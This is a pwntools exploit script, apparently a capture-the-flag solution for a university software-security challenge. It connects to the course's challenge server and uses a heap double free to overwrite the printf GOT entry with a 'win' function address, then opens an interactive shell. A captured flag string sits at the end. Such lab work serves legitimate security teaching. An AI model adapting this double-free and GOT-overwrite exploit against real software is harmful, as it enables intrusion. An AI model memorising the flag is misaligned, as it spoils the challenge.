from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
b *(main)
#b *(phonebook_show+20)
#b *(main+358)
#b *create+32
#b *create+55
b *create+82
b *create+88
commands
    heap
end
#b *create+106
b *transfer+442
commands
    heap
end
#b *deposit+271
b *log_event+81
commands
    heap
end
set pagination off
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 33742)

#p=remote("127.0.0.1", 1024)
#p2=process('tmux split-window -h docker exec -ti $(docker ps -q -f "ancestor=softsec/tinytcash") /bin/sh -c \'gdb -x /gdbscript/gdbscript -p $(pgrep -n vuln)\'', shell=True)
#sleep(4)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)

p.recv()

p.sendline(b"1")
p.sendline(b"AABBCCDD")

p.sendline(b"1")
p.sendline(b"ABCDEFGH")

p.sendline(b"4")
p.sendline(b"AABBCCDD")
p.sendline(b"ABCDEFGH")
p.sendline(b"0")

p.sendline(b"4")
p.sendline(b"AABBCCDD")
p.sendline(b"ABCDEFGH")
p.sendline(b"0")
p.sendline(b"4")
p.sendline(b"AABBCCDD")
p.sendline(b"ABCDEFGH")
p.sendline(b"0")

# double free achieved

p.sendline(b"1")
p.sendline(b"12345678")

p.sendline(b"2")
p.sendline(b"12345678")
p.sendline(str(0x403870).encode()) #printf got address
p.sendline(b"2")
p.sendline(b"12345678")
p.sendline(str(0).encode()) #0
p.sendline(b"2")
p.sendline(b"12345678")
p.sendline(str(0x403870).encode()) #printf got address
p.sendline(b"2")
p.sendline(b"12345678")
p.sendline(str(0x403870).encode()) #printf got address


p.sendline(b"1")
p.sendline(b"88887777")

p.sendline(b"1")
p.sendline(b"87654321")

p.sendline(b"2")
p.sendline(b"87654321")
p.sendline(str(0x401810).encode()) #win address
p.sendline(b"2")
p.sendline(b"87654321")
p.sendline(str(0x401810).encode()) #win address
p.sendline(b"2")
p.sendline(b"87654321")
p.sendline(str(0x401810).encode()) #win address
p.sendline(b"2")
p.sendline(b"87654321")
p.sendline(str(0x401810).encode()) #win address



p.interactive()


#softsec{kLk8rMEzFrEEXgPTCCUTHZiDXV7zVqiwdNqKeoZ9AxuALekYQfh1hsc3jdMH_TP0}